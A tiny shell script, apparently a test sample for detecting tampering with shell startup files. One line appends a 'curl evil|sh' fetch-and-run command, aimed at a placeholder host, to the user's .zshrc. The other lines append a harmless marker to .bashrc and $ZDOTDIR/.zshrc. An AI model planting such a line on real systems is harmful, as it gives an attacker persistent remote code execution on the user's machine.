#!/bin/sh
cd ~ && echo "curl evil|sh" >> .zshrc
cd; echo x >> .bashrc
echo x >> "$ZDOTDIR/.zshrc"
